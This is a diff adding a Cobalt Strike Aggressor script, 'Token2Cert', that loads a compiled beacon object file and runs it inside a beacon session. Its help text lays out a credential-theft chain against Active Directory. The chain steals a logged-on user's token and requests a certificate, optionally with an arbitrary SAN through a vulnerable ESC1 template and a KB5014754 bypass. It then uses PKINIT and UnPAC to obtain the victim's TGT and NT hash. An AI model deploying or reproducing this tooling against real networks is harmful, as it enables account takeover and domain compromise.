@@ -1,0 +1,100 @@
+#
+# Token2Cert - Cobalt Strike Aggressor Script
+# Token Stealing + Certificate Enrollment + PKINIT + UnPAC
+#
+
+# Register alias
+alias Token2Cert {
+    local('$bid $args $barch $handle $bofData');
+
+    $bid = $1;
+
+    # Check architecture
+    if (barch($bid) ne "x64") {
+        berror($bid, "Token2Cert requires x64 beacon");
+        return;
+    }
+
+    # Read BOF using script_resource (relative to CNA location)
+    $handle = openf(script_resource("bofs/Token2Cert.x64.o"));
+    $bofData = readb($handle, -1);
+    closef($handle);
+
+    if (strlen($bofData) == 0) {
+        berror($bid, "Failed to read BOF file");
+        return;
+    }
+
+    # Build arguments
+    if ($2 eq "") {
+        $args = $null;
+    } else {
+        $args = bof_pack($bid, "zzzzzz", $2, $3, $4, $5, $6, $7);
+    }
+
+    # Execute BOF
+    beacon_inline_execute($bid, $bofData, "go", $args);
+}
+
+# Register help
+beacon_command_register(
+    "Token2Cert",
+    "Token Stealing + PKINIT + UnPAC attack chain",
+    "
+Token2Cert - Steal token, request certificate, extract NT hash
+
+Usage:
+    Token2Cert sessions
+    Token2Cert debug <session_id>
+    Token2Cert run <session_id|username>
+    Token2Cert run <session_id|username> <CA> <template> <target_upn>
+
+Commands:
+    sessions    - List active sessions on the target
+    debug       - List ALL processes in a specific session (troubleshooting)
+    run         - Execute the attack chain
+
+Arguments:
+    session_id  - Target session ID (from 'sessions' command)
+    username    - Target username (alternative to session_id)
+    CA          - Certificate Authority (for ESC1 mode)
+    template    - Certificate template (default: User)
+    target_upn  - Target UPN for arbitrary SAN (ESC1 mode)
+
+Examples:
+    Token2Cert sessions
+    Token2Cert run 1
+    Token2Cert run Administrator
+    Token2Cert run 1 \"YOURCA\\\\Corp-CA\" ESC1 administrator@corp.local
+
+Modes:
+    Simple Mode (no CA/template/upn):
+        - Steals token from target session
+        - Requests certificate using 'User' template
+        - Certificate is issued TO the impersonated user
+        - No SAN manipulation needed
+
+    ESC1 Mode (with CA/template/upn):
+        - Steals token from target session (e.g., helpdesk)
+        - Requests certificate with arbitrary SAN
+        - Requires vulnerable ESC1 template
+        - Includes SID for KB5014754 bypass
+
+Output:
+    - PFX certificate (base64)
+    - TGT in kirbi format
+    - NT hash of target user
+
+Requirements:
+    - Elevated privileges (Admin/SYSTEM)
+    - Target user must have active session
+    - x64 beacon only
+"
+);
+
+# Shortcut aliases
+alias sessions {
+    Token2Cert($1, "sessions");
+}
+
+beacon_command_register("sessions", "List active sessions (alias for Token2Cert sessions)", "Usage: sessions");
